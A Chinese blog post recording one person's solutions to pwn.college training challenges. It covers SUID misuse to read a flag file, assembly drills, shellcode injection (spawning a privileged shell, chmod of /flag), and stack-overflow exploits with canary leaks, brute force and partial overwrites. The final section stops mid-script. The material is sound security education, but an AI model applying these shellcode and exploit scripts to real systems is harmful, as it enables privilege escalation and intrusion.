---
title: 追本溯源：pwn.college 作业记录
date: 2022-02-24 20:03:11
tags:
  - Linux
  - C/C++
  - Python
  - 整数溢出
  - 栈漏洞
categories:
  - 系统安全
---

时隔许久，我居然又得做 pwn 题了。

<!--more-->

## embryoio: Program Interaction

### 1

```shell
$ /challenge/$HOSTNAME
```

### 2

```shell
$ /challenge/$HOSTNAME
# ...
jdlwsscr
```

### 3

```shell
$ /challenge/$HOSTNAME ommhsqruhu
```

### 4

```shell
$ ykpoaq=vpysbewhjx /challenge/$HOSTNAME
```

### 5

```shell
$ echo mvrlsgks > /tmp/uulqde
$ /challenge/$HOSTNAME < /tmp/uulqde
```

### 6

```shell
$ /challenge/$HOSTNAME > /tmp/npruin
$ cat /tmp/npruin
```

### 7

```shell
$ env -i /challenge/$HOSTNAME
```

### 8

```shell
$ echo "/challenge/$HOSTNAME" > ~/myscript.sh
$ bash ~/myscript.sh
```

### 9-14

类似 1-7，但是使用了 8 的方法。

### 15

运行 `ipython`，然后输入：

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen(binary)
```

16-21 均需要在 ipython 环境下执行。

### 16

```shell
echo ztrvysos > input
```

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen(binary, stdin=open('input', 'r'))
```

### 17

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen([binary, 'dynoamrymg'])
```

### 18

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen(binary, env=dict(os.environ, iybxon="lcoldvawsc"))
```

### 19

```shell
$ echo dtzlsano > /tmp/ofslag
```

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen(binary, stdin=open("/tmp/ofslag","r"))
```

### 20

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen(binary, stdout=open("/tmp/gicfkh","w+"))
```

### 21

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen(binary, env=dict())
```

### 22

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
subprocess.Popen(binary).wait()
```

### 23-28

类似 16-21，但使用了 22 的方法。

### 29

29-35 模版，核心代码位于 `/* TODO */` 处：

```cpp
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

void pwncollege() {}

int main() {
    char binary[30] = "/challenge/";
    strcat(binary, getenv("HOSTNAME"));
    /* TODO */
    return 0;
}
```

核心代码：

```cpp
int pid = fork();

if (pid == 0) {
    execve(binary, NULL, NULL);
} else {
    wait(NULL);
}
```

`fork()` 出子进程执行二进制文件，使得其父进程为我们自己的程序。

### 30

同上。

### 31

```cpp
char *argv[] = {binary, "pxcsyjgoss", NULL};
int pid = fork();

if (pid == 0) {
    execve(binary, argv, NULL);
} else {
    wait(NULL);
}
```

### 32

```cpp
char *argv[] = {binary, "pxcsyjgoss", NULL};
char *env[] = {"kzdezt=fgdnllplui", NULL};
int pid = fork();

if (pid == 0) {
    execve(binary, argv, env);
} else {
    wait(NULL);
}
```

### 33

```cpp
int fd = open("/tmp/igzuqf", O_RDWR);
int pid = fork();

if (pid == 0) {
    dup2(fd, STDIN_FILENO);
    close(fd);
    execve(binary, NULL, NULL);
} else {
    close(fd);
    wait(NULL);
}
```

### 34

```cpp
int fd = open("/tmp/bkvmkz", O_RDWR);
int pid = fork();

if (pid == 0) {
    dup2(fd, STDOUT_FILENO);
    close(fd);
    execve(binary, NULL, NULL);
} else {
    close(fd);
    wait(NULL);
}
```

### 35

同 29。

### 36

```shell
$ /challenge/$HOSTNAME | cat
```

### 37

```shell
$ /challenge/$HOSTNAME | grep pwn
```

### 38

```shell
$ /challenge/$HOSTNAME | sed /pwn/p
```

### 39

```shell
$ /challenge/$HOSTNAME | rev | rev
```

### 40

```shell
$ cat | /challenge/$HOSTNAME
```

### 41

```shell
$ rev | /challenge/$HOSTNAME
```

倒序输入密码，`Ctrl+D`。

### 42-47

类似 36-41，但用 shell 脚本执行。

### 48

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
p1 = subprocess.Popen(binary, stdout=subprocess.PIPE)
p2 = subprocess.Popen("cat", stdin=p1.stdout)
p2.communicate()
```

48-53 都需要：

```shell
$ ipython
> %run interact.py
```

### 49

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
p1 = subprocess.Popen(binary, stdout=subprocess.PIPE)
p2 = subprocess.Popen(["grep","pwn"], stdin=p1.stdout)
p2.communicate()
```

### 50

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
p1 = subprocess.Popen(binary, stdout=subprocess.PIPE)
p2 = subprocess.Popen(["sed","/pwn/p"], stdin=p1.stdout)
p2.communicate()
```

### 51

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
p1 = subprocess.Popen(binary, stdout=subprocess.PIPE)
p2 = subprocess.Popen("rev", stdin=p1.stdout, stdout=subprocess.PIPE)
p3 = subprocess.Popen("rev", stdin=p2.stdout)
p3.communicate()
```

### 52

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
p1 = subprocess.Popen("cat", stdout=subprocess.PIPE)
p2 = subprocess.Popen(binary, stdin=p1.stdout)
p2.communicate()
```

### 53

```python
import subprocess
import os

binary = f'/challenge/{os.getenv("HOSTNAME")}'
p1 = subprocess.Popen("rev", stdout=subprocess.PIPE)
p2 = subprocess.Popen(binary, stdin=p1.stdout)
p2.communicate()
```

倒序输入密码，`Ctrl+D`。

### 54-59

类似 48-53，但使用 python 执行而不是 ipython。

### 60-65

类似 36-41，但使用 29 的方法编译出 `a.out` 并执行。

### 66

```shell
$ find /challenge/ -name embryoio* -exec {} \;
```

### 67

```shell
$ find /challenge/ -name embryoio* -exec {} uwazdyddun \;
```

### 68

68-73 模版：

```cpp
#include <unistd.h>
#include <sys/wait.h>

void pwncollege() {}

int main() {
    char binary[30] = "/challenge/";
    strcat(binary, getenv("HOSTNAME"));

    /* TODO */
    return 0;
}
```

核心代码：

```cpp
int i;
char *argv[200];
argv[0] = binary;

for (i = 1; i < 142; i++) {
    argv[i] = "dummy";
}
argv[142] = "nillucsndu";
argv[143] = NULL;
execve(binary, argv, NULL);
```

### 69

```cpp
execve(binary, NULL, NULL);
```

### 70

```cpp
char *env[] = {"146=sdzbeolria", NULL};
execve(binary, NULL, env);
```

### 71

```cpp
int i;
char *env[] = {"254=xeqznkovla", NULL};
char *argv[100];
argv[0] = binary;

for (i = 1; i < 77; i++) {
    argv[i] = "dummy";
}
argv[77] = "balycwokzx";
argv[78] = NULL;
execve(binary, argv, env);
```

### 72

```shell
#!/bin/bash
cd /tmp/ehpfci
/challenge/$HOSTNAME < jysqyp
```

### 73

```shell
#!/bin/bash
bash -c 'cd /tmp/wvliga && /challenge/$HOSTNAME'
```

### 74

```python
from pwn import *

binary = f'/challenge/{os.getenv("HOSTNAME")}'
context.binary = binary

args = [binary]

for i in range(41):
    args.append("gmphbjwhvy")

p = process(args)

p.interactive()
```

## babysuid: Program Misuse

### 1-9

`[command]` 指题目中拥有 root 权限的程序名。

```shell
$ [command] /flag
```

### 10

```shell
$ rev /flag | rev
```

### 11

```shell
$ od -w1000 -c /flag
$ echo 'p   w   n   .   c   o   l   l   e   g   e   {   s   C   G   -   E   C   B   Z   N   9   x   _   p   W   C   f   M   j   -   T   4   i   1   L   V   D   H   .   Q   X   z   U   T   M   s   A   T   O   4   I   z   W   }' | sed 's/ //g'
```

### 12

```shell
$ hd /flag
```

### 13

```shell
$ xxd -c 100 /flag
```

### 14

```shell
$ base32 /flag | base32 -d
```

### 15

```shell
$ base64 /flag | base64 -d
```

### 16

```shell
$ split /flag
$ cat xaa
```

### 17

```shell
$ gzip -k /flag
$ gzip -d /flag.gz -c
```

### 18

```shell
$ bzip2 -k /flag
$ bzip2 -d /flag.bz2 -c
```

### 19

```shell
$ zip flag.zip /flag
$ unzip flag.zip
$ cat flag
```

### 20

```shell
$ tar -cf flag.tar /flag
$ tar -xf flag.tar -O
```

### 21

```shell
$ ar r flag.bak /flag
$ ar p flag.bak
```

## embryoasm: Assembly Refresher

模版：

```python
from pwn import *
import os

assembly = '''
TODO
'''

binary = f'/challenge/{os.getenv("HOSTNAME")}'
context.binary = binary

p = process(binary)
p.send(asm(assembly))

p.interactive()
```

### 1

```asm
mov rdi, 0x1337
```

### 2

```asm
add rdi, 0x331337
```

### 3

```asm
imul rdi, rsi
add rdi, rdx
mov rax, rdi
```

### 4

`div` 默认 `rax` 为被除数，商放到 `rax`，余数放到 `rdx`。

```asm
mov rax, rdi
div rsi
```

### 5

```asm
mov rax, rdi
div rsi
mov rax, rdx
```

### 6

- rax, eax, ax, (ah | al)
- rbx, ebx, bx, (bh | bl)
- rdi, edi, di, (dih | dil)
- rsi, esi, si, (sih | sil)

```asm
mov al, dil
mov bx, si
```

### 7

注意字节和 bit 转换。

```asm
shl rdi, 32
shr rdi, 56
mov rax, rdi
```

### 8

```asm
and rdi, rsi
xor rax, rax
or rax, rdi
```

### 9

```asm
and rdi, 1
xor rdi, 1
xor rax, rax
or rax, rdi
```

### 10

注意 `add` 指令中，被加数的 `QWORD PTR` 不可省略。

```asm
mov rax, QWORD PTR [0x404000]
add QWORD PTR [0x404000],0x1337
```

### 11

```asm
mov al, BYTE PTR [0x404000]
mov bx, WORD PTR [0x404000]
mov ecx, DWORD PTR [0x404000]
mov rdx, QWORD PTR [0x404000]
```

### 12

长度较长的数字先放寄存器再赋值。

```asm
mov rbx,0xdeadbeef00001337
mov [rdi], rbx
mov rcx, 0x000000c0ffee0000
mov [rsi],rcx
```

### 13

```asm
mov rax, QWORD PTR [rdi]
mov rbx, QWORD PTR [rdi+8]
add rax, rbx
mov [rsi], rax
```

### 14

```asm
pop rax
sub rax, rdi
push rax
```

### 15

```asm
push rdi
push rsi
pop rdi
pop rsi
```

### 16

```asm
mov rax, [rsp+24]
add rax, [rsp+16]
add rax, [rsp+8]
add rax, [rsp]
mov rbx, 4
div rbx
push rax
```

### 17

中间有 0x51 个 nop，实际上跳了 0x53。

```asm
jmp .L2
.rept 0x51
nop
.endr
.L2:
pop rdi
mov rbx, 0x403000
jmp rbx
```

### 18

耐心算即可。

```asm
mov ebx, [rdi]
mov eax, [rdi+4]
mov ecx, [rdi+8]
mov edx, [rdi+12]
cmp ebx, 0x7f454c46
je .L2
cmp ebx, 0x00005a4d
je .L3
imul eax, ecx
imul eax, edx
jmp .done
.L2:
add eax, ecx
add eax, edx
jmp .done
.L3:
sub eax, ecx
sub eax, edx
.done:
```

### 19

```asm
cmp rdi, 3
jle .L2
jmp [rsi+0x20]
.L2:
imul rdi, 0x8
add rdi, rsi
jmp [rdi]
```

### 20

```asm
xor rax, rax;
mov rcx, rsi;
.loop:
mov ebx, DWORD PTR [rdi];
add rax, rbx;
add rdi, 0x4;
dec rcx;
jnz .loop;
div rsi
```

### 21

```asm
xor rax, rax;
.loop:
cmp BYTE PTR [rdi], 0;
je .done;
inc rax;
inc rdi;
jmp .loop;
.done:
```

### 22

注意 `cmp` 时用 `BYTE PTR`，以及 `rax` 和 `rdi` 的上下文保存和恢复。

```asm
xor rax, rax
mov rbx, 0x403000       # foo()
cmp rdi, 0              # if src_addr != 0
je .done
.loop:
cmp BYTE PTR [rdi], 0   # while [src_addr] != 0
je .done
cmp BYTE PTR [rdi], 90  # if [src_addr] <= 90
jg .fi
push rax                # save rax
push rdi                # save rdi
mov rdi, [rdi]          # arg1 <- [src_addr]
call rbx
pop rdi                 # restore rdi
mov [rdi], rax          # [src_addr] <- retval of foo()
pop rax                 # restore rax
inc rax
.fi:
inc rdi                 # src_addr++
jmp .loop
.done:
ret
```

### 23

注意用 rsp 寻址代替 rbp 寻址：`[rbp-x] == [rsp+x]`。

```asm
push rbp
mov rbp, rsp
sub rsp, 0x100              # 0 - 0xff

xor rbx, rbx
.loop:
mov cl, BYTE PTR [rdi+rbx]  # curr_byte = [src_addr + i]
inc BYTE PTR [rsp+rcx]      # [stack_base - curr_byte]++
inc rbx                     # i++
cmp rbx, rsi                # for i < size
jl .loop
xor rbx, rbx                # b = 0

xor rcx, rcx                # max_freq = 0
xor rax, rax                # max_freq_byte = 0
.loop2:
cmp BYTE PTR [rsp+rbx], cl  # if [stack_base - b] > max_freq
jle .fi;
mov cl, BYTE PTR [rsp+rbx]  # max_freq = [stack_base - b]
mov rax, rbx                # max_freq_byte = b
.fi:
inc rbx                     # b++
cmp rbx, 0xff               # for b <= 0xff
jle .loop2

mov rsp, rbp
pop rbp                     # (mov rsp, rbp) + (pop rbp) = leave
ret
```

## babyshell: Shellcode Injection

模版：

```python
from pwn import *

binary = f'/challenge/{os.getenv("HOSTNAME")}'
context.binary = binary
p = process(binary)

nop = b'\x90'
# TODO
p.interactive()
```

### 1

ORW 方法:

```python
# read(0, address of rip, 1000)
sc1 = """
xor rax, rax
xor rdi, rdi
lea rsi, [rip]
mov rdx, 1000  # <- rip
syscall        # sc2 comes after syscall
"""
# orw
sc2 = shellcraft.readfile("/flag", 1)

p.send(asm(sc1))
p.send(nop*16 + asm(sc2))
```

拿 Shell 方法:

```python
# execve("/bin/sh\x00",["/bin/sh\x00", "-p\x00\x00"],NULL)
sc = """
mov rax, 59                # execve
mov rbx, 0x68732f6e69622f  # "/bin/sh"
push rbx
mov rdi, rsp               # rdi -> "/bin/sh" on stack
push 0x702d                # "-p"
mov rcx, rsp               # rcx -> "-p" on stack
push 0
push rcx
push rdi
mov rsi, rsp               # rsi -> [rdi, rcx, 0] on stack -> ["/bin/sh","-p",NULL]
mov rdx, 0                 # NULL
syscall
"""

p.send(asm(sc))
```

### 2

nop sled，沿用上题的 `sc`：

```python
p.send(nop*0x800 + asm(sc))
```

### 3

编码去掉 NULL byte，沿用上题的 `sc`：

```python
p.send(encoder.encode(asm(sc), b'\x00'))
```

### 4

不能出现 `H` 字节，因此使用 32 位寄存器：

```python
# read(0, address of rip, 1000)
sc1 = """
xor eax, eax
xor edi, edi
lea esi, [rip]
mov edx, 1000  # <- rip
syscall        # sc2 comes after syscall
"""
# orw
sc2 = shellcraft.readfile("/flag", 1)

p.send(asm(sc1))
p.send(nop*16 + asm(sc2))
```

### 5

不能出现 syscall。syscall 是 `0f 05`，因此在最后加一句 `0e 05`，然后用 `inc BYTE PTR [rip]` 给最后一句加一变成 `syscall`。

```python
# read(0, address of rip, 1000)
sc1 = """
xor rax, rax
xor rdi, rdi
lea rsi, [rip]
mov rdx, 1000  # <- rip
inc BYTE PTR [rip] # rip on next line, which is 0e 05
"""
# orw
sc2 = shellcraft.readfile("/flag", 1)

p.send(asm(sc1)+b'\x0e\x05')
p.send(nop*16 + asm(sc2))
```

### 6

不能出现 syscall，而且禁止在 shellcode 前 4096 字节区域内的写操作。我直接跳了前 4096 字节然后用 5 的方法，暂时没有想到其他方法。

```python
# read(0, address of rip, 1000)
sc1 = """
.rept 4096
nop
.endr
xor rax, rax
xor rdi, rdi
lea rsi, [rip]
mov rdx, 1000  # <- rip
inc BYTE PTR [rip] # rip on next line, which is 0e 05
"""
# orw
sc2 = shellcraft.readfile("/flag", 1)

p.send(asm(sc1)+b'\x0e\x05')
p.send(nop*16 + asm(sc2))
```

### 7

关闭了 stdin，因此不能用上文 ORW 方法中的 multi-stage 方式读 shellcode 了；关闭了 stdout 和 stderr，因此没有回显。这里用的方法是通过 `chmod` 系统调用修改 `/flag` 权限，最后 `cat /flag` 即可。

```python
# chmod("/flag", 777)
sc = """
mov rax, 0x5a          # chmod
mov rbx, 0x67616c662f  # "/flag"
push rbx
mov rdi, rsp           # rdi -> "/flag" on stack
mov rsi, 0x1ff         # 777 -> 111 111 111
syscall
"""
p.send(asm(sc))
```

### 8

只能读 0x12 字节，因此要尽量缩短汇编代码的长度。由于 `/flag` 最终需要占 8 字节，需要 64 位寄存器存储，因此可以 `ln -s /flag a` 创建一个名为 `a` 的符号链接。权限方面也只需要 others 拥有读权限，因此设置为最小值 `4` 即可。最后根据情况缩减所使用的寄存器长度。

注意这里用 `mov bx, 0x61` 而不是 `bl`，是因为我们将 `bx` 推到栈上时有可能并没有遇到 0 字节，使得字符串 `a` 没能结尾。因此我们给 `bx` 赋值可以保证字符串以 0 字节结尾。

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
mov bx, 0x61  # "a"
push rbx
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""
p.send(asm(sc))
```

### 9

每 10 字节会插入 10 字节的 0xcc，也就是 `int 3`，题目提示我们要阻止这些 `int 3` 被执行，因此计算好字节数并 `jmp` 掉即可。

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
mov bx, 0x61  # "a"
push rbx
nop
jmp .L2
.rept 10
nop
.endr
.L2:
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""
p.send(asm(sc))
```

### 10-12

payload 和 8 相同，因为 8 的 payload 恰好可以满足这几题的条件。

### 13

只能读 0xc 字节，需要进一步压缩 8 的 payload。容易注意到 `mov bx, 0x61` 和 `push rbx` 可以合并为 `push 0x61`，恰好 12 字节。

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
push 0x61     # "a"
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""
p.send(asm(sc))
```

### 14

只能读 6 字节。注意到 rax 原本就是 0，可以省略对其的初始化；gdb 中能看到 rdx 中原本存储了 shellcode 的地址，因此我们可以直接写入这个地址；rsi 中原本存储了一个较大的数字，我们可以直接用来作为 `read` 的第三个参数。综上，要做的只有给 rdi 赋值 0、将 rdx 的值赋值给 rsi、调用 syscall 三件事，每件事都可以压缩到 2 个字节。

```python
# read(0, address of shellcode, some big number)
sc1 = """
xor edi, edi
push rdx
pop rsi
syscall
"""
# orw
sc2 = shellcraft.readfile("/flag", 1)

p.send(asm(sc1))
p.send(nop*16 + asm(sc2))
```

## babymem: Memory Errors

模版：

```python
from pwn import *

sa = lambda delim,data: p.sendafter(delim,data)
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def s(pl, sz=None):
    if sz is None:
        sz = len(pl)
    sla('Payload size: ', str(sz))
    sa('bytes)!\n', pl)

binary = f'/challenge/{os.getenv("HOSTNAME")}'
context.binary = binary
# context.log_level = 'DEBUG'
p = process(binary)

nop = b'\x90'
# TODO
p.interactive()
```

### 1.0

直接给了偏移量 44，只要溢出 1 字节就能将目标值改成非 0 了。

```python
payload = b'a'*44 + b'\x01'
s(payload)
```

### 1.1

没有给偏移量，可以无视偏移量直接输入很长的 payload，因为 canary 检查在 `win` 执行之后。

```python
payload = b'a'*0x100
s(payload)
```

### 2.0

和 1.0 类似，只不过在堆上。

```python
payload = b'a'*192 + b'\x01'
s(payload)
```

### 2.1

和 1.1 类似，只不过在堆上。

```python
payload = b'a'*0x200
s(payload)
```

### 3.0

提供了偏移量和目标函数地址，直接覆盖返回地址即可。

```python
win = 0x401554
payload = b'a'*88+p64(win)
s(payload)
```

### 3.1

用 pwndbg 的 `cyclic` 可以准确确定偏移量，`info func` 可以得到 `win` 的地址。

```python
win = 0x4020e1
payload = b'a'*(128+8)+p64(win)
s(payload)
```

> 注：babymem 后续所有题目的 `x.1` 均是在 `x.0` 基础上要求自己确定偏移量和地址，不再赘述。

### 4.0

对输入长度进行检查，可以用整数溢出绕过，绕过后可能需要多运行几次才能成功，题目也给了提示：

> Because the read() call will interpret your size differently than the check above, the resulting read will be unstable and might fail. You will likely have to try this several times before your input is actually read.

这里 `size` 也可以直接写 `-1`。

```python
win = 0x401861
payload = b'a'*88+p64(win)
size = 0xffffffff

s(payload, size)
```

### 5.0

需要做一次乘法后得到溢出的结果，可以用 2 \* 2147483648 得到。

```python
win = 0x4017eb
payload = b'a'*152+p64(win)
num = 2
size = 2147483648

sla('to send: ', num)
sla('record: ', size)
sa('bytes)!\n', payload)
```

### 6.0

题目给了做法，就是跳到检查语句后面的地址就可以绕过检查。

```python
win = 0x402177
payload = b'a'*88+p64(win)
s(payload)
```

### 7.0

和 6.0 一样需要跳到检查语句后面，IDA 可以看到这个地址是 0x358，区别在于开启了 ASLR 我们只能确定地址的后三位。这里使用的技巧是仅仅覆盖最后两个字节，此时倒数第 4 个 bit 有 1/16 的概率猜对，多运行几次即可。

本题可以删除模版中的 `p=process(binary)` 一行。

```python
win = 0x358
payload = b'a'*72+p16(win)

while True:
    p = process(binary)
    s(payload)

    res = p.recvall()
    if b'pwn.college{' in res:
        print(res[-100:])
        break
```

### 8.0

在 7.0 的基础上，会用 `strlen` 检查 `buf` 长度，直接 0 字节截断即可。

```python
win = 0x14f
payload = b'\x00'*8 + b'a'*128 + p16(win)

while True:
    p = process(binary)
    s(payload)

    res = p.recvall()
    if b'pwn.college{' in res:
        print(res[-100:])
        break
```

### 9.0

本题需要覆盖读计数器，从而跳过 canary 写入返回地址，题目给了读计数器的实现：

```c
while (n < size) {
      n += read(0, input + n, 1);
}
```

还给了 `n` 的偏移量 36 和返回地址偏移量 56，因此根据上述实现将 `n` 覆盖为 55，下一次循环就可以写返回地址的最低字节了。由于要写最低两字节，因此 `size` 设置为 58 即可，和 payload 长度无关。

```python
win = 0xc0a
payload = b'a'*36+p8(56-1)+p16(win)
size = 56+2

while True:
    p = process(binary)
    s(payload, size)

    res = p.recvall()
    if b'pwn.college{' in res:
        print(res[-100:])
        break
```

### 10.0

flag 在栈上，距离输入 73 字节的地方，小于输入到 rbp 的距离，因此本题不需要溢出，也不用管 canary 和 ASLR，只需要填充 73 个非零字节，最后打印时就会顺带打印出后面的 flag。

```python
payload = b'a'*73
s(payload)
```

### 11.0

类似 10.0，只不过 mmap 在了堆上。

```python
payload = b'a'*4096*7
s(payload)
```

### 12.0

题目提供了一个后门，使得只要输入中含有 `REPEAT`，`challenge()` 就会重新执行。利用这一点以及 canary 最低字节必定为 0 的特性，我们覆盖 canary 最低字节为 `0x01`，从而使得栈上字符串不被截断，顺带打印出 canary 高 7 字节的值。随后在溢出时只需要注意用正确的值覆盖 canary 即可绕开检测，剩余部分类似 7.0。

```python
win = 0x751

while True:
    p = process(binary)
    payload = b'REPEATaa' + b'a'*0x10 + b'\x01'
    s(payload)
    ru(b'\x01')
    canary = u64(b'\x00' + r(7))
    leak('canary', canary)

    payload = b'a'*0x18 + p64(canary) + b'a'*8 + p16(win)
    s(payload)

    res = p.recvall()
    if b'pwn.college{' in res:
        print(res[-100:])
        break
```

### 13.0

类似 10.0。

```python
payload = b'a'*172
s(payload)
```

### 14.0

本题和 12.0 的区别在于打印函数只会打印 268 个字符，而输入到 canary 相距 272 字节。不过本题比较仁慈，canary 的值在栈上距离更近的位置也有出现，可以 leak 这些位置的值。

```python
win = 0x13c

while True:
    p = process(binary)
    payload = b'REPEATaa' + b'\x01'
    s(payload)

    ru(b'\x01')
    canary = u64(b'\x00' + r(7))
    leak('canary', canary)

    payload = b'a'*280 + p64(canary) + b'a'*8 + p16(win)
    s(payload)

    res = p.recvall()
    if b'pwn.college{' in res:
        print(res[-100:])
        break
```

### 15.0

暴力枚举 canary 的每一位，因为服务器每次 `fork()` 不会重新随机产生 canary（注意保持服务器开启）。而在暴力猜 win 地址倒数第四位时则可以通过重启服务器来重试。

```python
win = 0x1d85
payload = b'a'*24 + b'\x00'

for i in range(7):
    for b in range(0x100):
        p = remote("127.0.0.1", 1337)
        guess = b.to_bytes(1, 'big')
        s(payload + guess)

        ru('Goodbye!\n')
        res = p.recv(timeout=0.5)

        if res == b'':
            leak(f'Byte {i} of canary', b)
            payload += guess
            break

p = remote("127.0.0.1", 1337)
payload += b'a'*8 + p16(win)
s(payload)
```

## toddlerone: Exploitation Scenarios

模版同 babymem。

### 1.0

注入类似 babyshell 1 的 shellcode，然后 ret2shellcode。

ORW 方法：

```python
# read(0, address of rip, 1000)
sc1 = """
xor rax, rax
xor rdi, rdi
lea rsi, [rip]
mov rdx, 1000  # <- rip
syscall        # sc2 comes after syscall
"""
# orw
sc2 = shellcraft.readfile("/flag", 1)

sc1_addr = 0x169e0000
sa('stdin.', asm(sc1))

payload = b'a'*0x38 + p64(sc1_addr)
s(payload)
p.send(nop*16 + asm(sc2))
```

拿 shell 方法：

```python
# execve("/bin/sh\x00",["/bin/sh\x00", "-p\x00\x00"],NULL)
sc = """
mov rax, 59                # execve
mov rbx, 0x68732f6e69622f  # "/bin/sh"
push rbx
mov rdi, rsp               # rdi -> "/bin/sh" on stack
push 0x702d                # "-p"
mov rcx, rsp               # rcx -> "-p" on stack
push 0
push rcx
push rdi
mov rsi, rsp               # rsi -> [rdi, rcx, 0] on stack -> ["/bin/sh","-p",NULL]
mov rdx, 0                 # NULL
syscall
"""
sc_addr = 0x169e0000
sa('stdin.', asm(sc))

payload = b'a'*0x38 + p64(sc_addr)
s(payload)
```

为调试方便，后续题目使用 babymem 13 的 shellcode。

> 注：toddlerone 后续所有题目的 `x.1` 均是在 `x.0` 基础上要求自己确定偏移量和地址，不再赘述。

### 2.0

往栈上写 shellcode，然后返回到栈上。

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
push 0x61     # "a"
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""
sc_addr = 0x7fffffffd290

payload = asm(sc).ljust(0x78, b'a') + p64(sc_addr)
s(payload)
```

2.1 的主要坑点在于，为了确定栈地址需要将环境变量清空：

```python
p = gdb.debug(binary, env={})
```

随后再 gdb 确定偏移量即可，最后编写 exp 时也要注意清空环境变量使栈地址固定：

```python
p = process(binary, env={})
```

为了避免环境变量影响，接下来的题目中均使用这种方式启动进程。

> 2.0 中如果清空环境变量，则 `sc_addr` 应设置为 `0x7fffffffdcb0`。

### 3.0

第一轮同时泄漏 canary 和 Saved RBP 地址，我们希望通过 Saved RBP 地址推导出栈上的输入地址。

观察可得：

- 第一次 challenge 输入地址 - 第二次 challenge 输入地址 = 0xd0

- Saved RBP 地址 - 输入地址 = 0x10c0

由此可以算出：

第二次 challenge 输入地址 = 第一次 challenge 输入地址 - 0xd0 = （第一次 Saved RBP 地址 - 0x10c0）- 0xd0

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
push 0x61     # "a"
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""

payload = b'REPEATaa' + b'a'*0x70 + b'\x01'
s(payload)
ru(b'\x01')
canary = u64(b'\x00' + r(7))
leak('canary', canary)
saved_rbp = u64(r(6).ljust(8, b'\x00'))
leak('saved rbp', saved_rbp)

chall1_buf = (saved_rbp - 0x10c0)
chall2_buf = chall1_buf - 0xd0
leak('sc addr', chall2_buf)
payload = asm(sc).ljust(0x78, b'a') + p64(canary) + b'a'*8 + p64(chall2_buf)
s(payload)
```

### 4.0

在 3.0 基础上对 canary 前的一个值有要求。

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
push 0x61     # "a"
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""
val = 0x68EDE977CB04B929

payload = b'REPEATaa' + b'a'*0x80 + b'\x01'
s(payload)
ru(b'\x01')
canary = u64(b'\x00' + r(7))
leak('canary', canary)
saved_rbp = u64(r(6).ljust(8, b'\x00'))
leak('saved rbp', saved_rbp)

chall1_buf = (saved_rbp - 0x10d0)
leak('chall1 buf', chall1_buf)
chall2_buf = chall1_buf - 0xe0
leak('sc addr', chall2_buf)
payload = asm(sc).ljust(0x80, b'a') + p64(val) + p64(canary) + b'a'*8 + p64(chall2_buf)
s(payload)
```

### 5.0

在 4.0 的基础上隔开了 canary 和 Saved RBP，可以用 REPEAT 两轮分两次泄漏。还有一个 seccomp 沙箱，但是可以通过程序中的后门逃逸，只要让栈上的一个值为特定值即可。

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
push 0x61     # "a"
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""
val = 0x848FFD3CEC0476D2

payload = b'REPEATaa' + b'a'*0x20
s(payload + b'\x01')
ru(b'\x01')
canary = u64(b'\x00' + r(7))
leak('canary', canary)

payload += b'a'*0x18
s(payload)
ru(payload)
saved_rbp = u64(r(6).ljust(8, b'\x00'))
leak('saved rbp', saved_rbp)

chall1_buf = (saved_rbp - 0xe0)
leak('chall1 buf', chall1_buf)
chall2_buf = chall1_buf - 0xa0
leak('sc addr', chall2_buf)
payload = asm(sc).ljust(0x10, b'a') + p64(val) + b'a'*0x10
payload += p64(canary) + b'a'*0x18 + p64(chall2_buf)
s(payload)
```

### 6.0

在 5.0 的基础上需要把栈上的 seccomp 参数改成需要的系统调用号。

```python
# chmod("a", 4)
sc = """
mov al, 0x5a  # chmod
push 0x61     # "a"
mov rdi, rsp  # rdi -> "a" on stack
mov sil, 4    # 4 -> 000 000 100
syscall
"""

payload = b'REPEATaa' + b'a'*0x80
s(payload)
s(payload + b'\x01')
ru(b'\x01')
canary = u64(b'\x00' + r(7))
leak('canary', canary)

payload += b'a'*0x18
s(payload)
ru(payload)
saved_rbp = u64(r(6).ljust(8, b'\x00'))
leak('saved rbp', saved_rbp)

chall1_buf = (saved_rbp - 0x1a0)
leak('chall1 buf', chall1_buf)
chall2_buf = chall1_buf - 0x100
leak('sc addr', chall2_buf)
pause()
